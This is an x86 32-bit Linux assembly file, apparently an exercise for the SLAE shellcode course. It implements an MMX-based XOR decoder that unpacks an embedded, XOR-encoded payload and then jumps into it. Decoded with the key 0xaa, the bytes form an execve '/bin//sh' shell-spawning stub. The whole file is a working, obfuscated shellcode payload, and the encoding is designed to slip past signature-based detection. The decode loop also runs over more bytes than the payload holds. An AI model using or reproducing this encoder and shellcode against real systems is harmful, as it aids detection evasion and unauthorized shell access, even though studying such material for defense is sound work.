; Executable name       : xor-mmx
; Designed OS           : Linux (32-bit)
; Author		: wetw0rk
; Version               : 1.0
; Created Following     : SLAE
; Description           : An example of xor decoder via mmx
;
; Build using these commands:
;       nasm -f elf32 -o xor-mmx.o xor-mmx.asm
;       ld -o xor-mmx xor-mmx.o
;       objdump -D xor-mmx -M intel
;

SECTION .text

global _start

_start:
	jmp short call_decoder

decoder:
	pop eax							; POP <decoder_value>'s address
								; from the stack into EAX

	lea ebx,[eax+8]						; load <shellcode>'s address into
								; EBX

	xor ecx,ecx						; zero out ECX
	mov cl,4						; store 4 into CL for our
								; counter for the loop
decode:
	movq mm0,qword [eax]					; MOV 8 bytes from EAX into mm0
								; which is <decoder_value>

	movq mm1,qword [ebx]					; MOV 8 bytes from EBX <shellcode>
								; into mm1

	pxor mm0,mm1						; XOR 8 bytes and store the result
								; in mm0

	movq qword [ebx],mm0					; move mm0 into <shellcode> or EBX
	add ebx,8						; ADD 8 to EBX to load next 8 bytes
	loop decode						; LOOP 4 times

	jmp short shellcode					; Once loops complete our <shellcode>
								; should be decoded

call_decoder:
	call decoder						; CALL decoder label

decoder_value: db 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa	; this is what we will use for
								; PXOR operator to decode <shellcode>

shellcode:
	db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2		; encoded shellcode
	db 0xc2,0x85,0xc8,0xc3,0xc4,0x1a,0xa1,0x23		; ^
	db 0x49,0x67,0x2a					; |
